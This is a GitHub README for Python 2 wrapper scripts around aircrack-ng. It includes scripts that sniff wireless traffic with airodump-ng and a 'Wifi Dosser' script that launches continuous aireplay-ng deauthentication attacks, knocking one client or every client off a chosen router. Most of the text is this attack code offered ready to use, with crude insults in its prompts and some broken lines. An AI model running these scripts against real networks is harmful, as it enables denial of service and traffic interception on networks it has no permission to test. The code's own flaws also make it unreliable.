# Kali-Linux-Wifi-Short-Cut-Scripts
These scripts consist of an easier, shorter way to do things via wireless attacks using Aircrack-ng suite of network tools. Make sure to give credit to Thomas d'Otreppe de Bouvette for original code. These are just short cuts, without having to pass in commands.

#files included
For Scanning network traffic
-------------------------------------
FILE: [__sniff_traffic.py__](https://github.com/scriptedp0ison/Kali-Linux-Wifi-Short-Cut-Scripts/blob/master/sniff_traffic.py)

USE: Scan *most traffic* on specified NIC using airodump-ng (monitor mode must be enabled, may give error on NIC with promiscuous mode enabled)

```python
import sys
import subprocess
import time
from datetime import  datetime


def get_network_data():
    st = datetime.now()
    print('[+] Started on %s/%s/%s %s:%s:%s' % (st.month, st.day, st.year, st.hour, st.minute, st.second))
    get_traffic = raw_input('[+] Start sniffing network traffic(y/n): ')
    if get_traffic == 'y' or get_traffic == 'yes':
        print('[+] Sniffing traffic on wireless network card...')
	get_card = raw_input('[+] Enter interface to sniff traffic on: ')
        call_command = 'airodump-ng {}'.format(get_card)
	subprocess.call(call_command, shell=True)
    if get_traffic == 'n' or get_traffic == 'no':
        print('[!] Not sniffing traffic! Exitting...')
        time.sleep(3)
        exit()

get_network_data()
```


For Scanning traffic specific network
--------------------------------------
FILE: [__get_client.py__](https://github.com/scriptedp0ison/Kali-Linux-Wifi-Short-Cut-Scripts/blob/master/get_client.py)

USE: Scan *most traffic* on specified network using airodump-ng (monitor mode must be enabled, may give error on NIC with promiscuous mode enabled)

This can be used to *directly monitor* 802.11 traffic

```python
import subprocess
import sys
import time
from datetime import datetime

#print(sys.argv[0])
print(""" 
Wifi Packet Sniffer v0.1
-------------------------------
Options:
	-c 	Channel to listen on
	-m	Target address
	-i 	Interface to use
Credits:
	Re-scripted by scriptedp0ison
	Original program airodump-ng created by Thomas d'Otreppe
	Visit http://www.aircrack-ng.org for more info
""")

if sys.argv > 1 and sys.argv > 2 and sys.argv > 3 and sys.argv > 4 and sys.argv > 5 and sys.argv > 6:
	#subprocess.call(sys.argv[1], shell=True)
	print('[+] Channel set to: {}'.format(sys.argv[2]))
	time.sleep(2)
	print('[+] Target mac set to: {}'.format(sys.argv[4]))
	time.sleep(2)
	print('[+] Network card set to listen on: {}'.format(sys.argv[6]))
	time.sleep(2)
	print('[+] Compiling system arguments...')
	time.sleep(1)
	print('[+] Executing system arguments...')
	time.sleep(2)
	launch_attack = 'airodump-ng -c {} --bssid {} {}'.format(sys.argv[2], sys.argv[4], sys.argv[6])
	subprocess.call(launch_attack, shell=True)
if sys.argv[1] == '-h' or sys.argv[1] == '-help' or sys.argv[1] == '--help':
	print(""" Wifi Dosser v0.1 - Do not use for illegal purposes! Do not test on networks you dont own or have permission to test!
		_____________________________________________________________________________________________________________________
	Options:
	-h	Display the help screen
	-m	Target MAC Address
	-c	channel to listen on
	-i	Network Interface card
	Examples:
		python get_client.py -c <channel to listen on> -m <target mac address> -i <NIC>
	""")

```


For Deauthentication attacks (IEEE 802.11) NOTE: *IEEE 802.11w is more secure!*
--------------------------------------
FILE: [__wifi_dosser.py__](https://github.com/scriptedp0ison/Kali-Linux-Wifi-Short-Cut-Scripts/blob/master/wifi_dosser.py)

USE: Send deauthentication packets to client connected to router, or to all clients on router



```python
import time
import subprocess
from datetime import datetime

#start program
class DeauthenticationAttack:
	def __init__(self, option, mac_address, kick_client, kick_all, iface, router_bssid_one, router_bssid_two, iface_one, iface_two):
		self.option = option
		self.mac_address
		self.kick_client = kick_client
		self.kick_all = kick_all
		self.iface = iface
		self.router_bssid_one = router_bssid_one
		self.router_bssid_two = router_bssid_two
		self.iface_one = iface_one
		self.iface_two = iface_two

	@classmethod
	def kick_client_from_router(cls):
		cls.router_bssid_one = raw_input('[+] Enter BSSID of router: ')
		print('[+] Router MAC address set to: {}'.format(cls.router_bssid_one))
		time.sleep(2)
		cls.kick_client = raw_input('[+] Enter client MAC address to kick: ')
		print('[+] Client MAC address set to: {}'.format(cls.kick_client))
		cls.iface_one = raw_input('[+] Enter interface')
		print('[+] Interface set to: {}'.format(cls.iface_one))
		launch_attack = raw_input('[+] Attack ready to launch! Launch attack(y/n): ')
		if(launch_attack == 'y') or (launch_attack == 'yes'):
			print('[+] Shits about to get realz...')
			time.sleep(3)
			launch_dos_attack = 'aireplay-ng -0 0 -a {} -c {} {}'.format(cls.router_bssid_one, cls.kick_client,
															cls.iface_one)
			subprocess.call(launch_dos_attack, shell=True)
		elif(launch_attack == 'n') or (launch_attack == 'no'):
			print('[+] Ahh what a waste of time you sissy ass bitch! Bye...dont come back \#LuLz')
			time.sleep(3)
			exit()
	@classmethod
	def kick_all_from_router(cls):
		cls.router_bssid_two = raw_input('[+] Enter BSSID of router: ')
		cls.iface_two = raw_input('[+] Enter interface to use: ')
		print('[+] Interface set to: {}'.format(cls.iface_two))
		launch_the_attack = raw_input('[+] Attack ready to launch! Launch attack(y/n): ')
		if(launch_the_attack == 'y') or (launch_the_attack == 'yes'):
			print('[+] Shits about to get realz...')
			time.sleep(3)
			launch_da_dos_attack = 'aireplay-ng -0 0 -a {} {}'.format(cls.router_bssid_two, cls.iface_two)
			subprocess.call(launch_da_dos_attack, shell=True)

	@classmethod
	def get_option(cls):
		print(""" 
		Wifi Dosser v0.1
		---------------------------
		1.) Kick a client
		2.) Kick all from router
		""")
		cls.option = raw_input('[+] Select an option from above: ')
		if(cls.option == str(1)):
			print('[+] Option set to: 1')
			time.sleep(2)
			DeauthenticationAttack.kick_client_from_router()
		elif(cls.option == str(2)):
			print('[+] Option set to: 2')
			time.sleep(2)
			DeauthenticationAttack.kick_all_from_router()



DeauthenticationAttack.get_option()











#end program
```
